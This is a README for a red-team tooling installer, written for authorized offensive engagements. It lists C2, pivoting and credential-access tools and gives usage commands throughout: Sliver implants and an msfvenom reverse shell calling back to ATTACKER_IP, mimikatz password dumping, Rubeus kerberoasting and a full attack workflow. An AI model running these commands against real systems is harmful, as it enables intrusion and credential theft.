# Red Team Toolkit

## Overview
The Red Team Toolkit provisions offensive security tools for red team engagements.
It focuses on C2, initial access, post-exploitation, and evasion — with shared
tools from `_shared/` to avoid duplication.

## Tools Installed

### C2 Framework
| Tool | Purpose | Notes |
|------|---------|-------|
| Sliver | Open-source C2 framework (BishopFox) | GitHub releases |

### Initial Access
| Tool | Purpose | Pre-installed? |
|------|---------|----------------|
| donut | Shellcode generator (C#/.NET -> shellcode) | |
| msfvenom | Payload generator | Pre-installed (skipped) |

### Shared Tools (from _shared/)
| Tool | Purpose |
|------|---------|
| kerbrute | Kerberos user enum + password spray |
| Ligolo-ng | Pivoting proxy |
| mimikatz.exe | Credential dumping (Windows) |
| Rubeus.exe | Kerberos abuse (Windows) |
| Certify.exe | ADCS attacks (Windows) |
| nc64.exe | Netcat for Windows |
| php_reverse_shell.php | PHP reverse shell |

### Pre-installed in Kali (not duplicated)
| Tool | Purpose |
|------|---------|
| msfvenom | Payload generator |
| Responder | LLMNR/NBT-NS poisoning |
| netexec | SMB/AD enumeration |
| evil-winrm | WinRM shell |
| Metasploit | Exploitation framework |
| crackmapexec | SMB tool |

## Directory Layout
```
~/Desktop/Kali-God-Mode/red-team/
├── tools/
│   ├── c2/                      Sliver C2 (server + client)
│   ├── pivoting/                → symlink to _shared/Ligolo-ng/
│   ├── post-exploit/            → symlink to _shared/windows/
│   ├── webshells/               PHP reverse shell + collection
│   └── kerbrute                 → symlink to _shared/kerbrute
└── tools-info.txt               Tool listing with run commands

~/Desktop/Kali-God-Mode/_shared/
├── kerbrute                     Shared across AD + Red Team
├── Ligolo-ng/                   Shared across AD + Red Team
└── windows/                     Shared Windows binaries
```

## Usage

### Install via Kali-God-Mode
```bash
./Kali-God-Mode.sh --red-team
```

### Sliver C2
```bash
# Start Sliver server
sliver-server

# Generate implant
generate --mtls ATTACKER_IP --os windows --arch amd64 --save /tmp/implant.exe

# Start listener
mtls
```

### donut
```bash
# Generate shellcode from a C# assembly
donut -f /path/to/Assembly.exe -o /tmp/payload.bin

# With options
donut -f payload.exe -a x64 -b 3 -o shellcode.bin
```

### Ligolo-ng (Pivoting)
```bash
# Attack box
cd ~/Desktop/Kali-God-Mode/_shared/Ligolo-ng
./ligolo-ng_proxy -selfcert

# On victim (transfer agent first)
ligolo-ng_agent.exe -connect ATTACKER_IP:11601 -ignore-cert
```

### Credential Access
```bash
# mimikatz (run on Windows victim)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Rubeus (run on Windows victim)
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe asktgt /user:admin /password:pass123
```

### Typical Red Team Workflow
```bash
# 1. Recon
nmap -sC -sV TARGET
nuclei -u TARGET -severity critical,high

# 2. Initial Access
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe

# 3. C2
sliver-server > generate --mtls ATTACKER_IP --os windows
sliver-server > mtls

# 4. Pivoting (after initial foothold)
ligolo-ng_proxy -selfcert
# Transfer ligolo-ng_agent.exe to victim

# 5. Post-Exploitation
# Transfer mimikatz, Rubeus, Certify to victim
# Run from victim for credential dumping and abuse
```

## Cobalt Strike (Manual Install)
Cobalt Strike requires a licensed copy. To add it to this toolkit:
1. Download Cobalt Strike from your licensed source
2. Place the `cobaltstrike` directory in `~/Desktop/Kali-God-Mode/red-team/tools/c2/`
3. Create a wrapper script in `scripts/` if needed
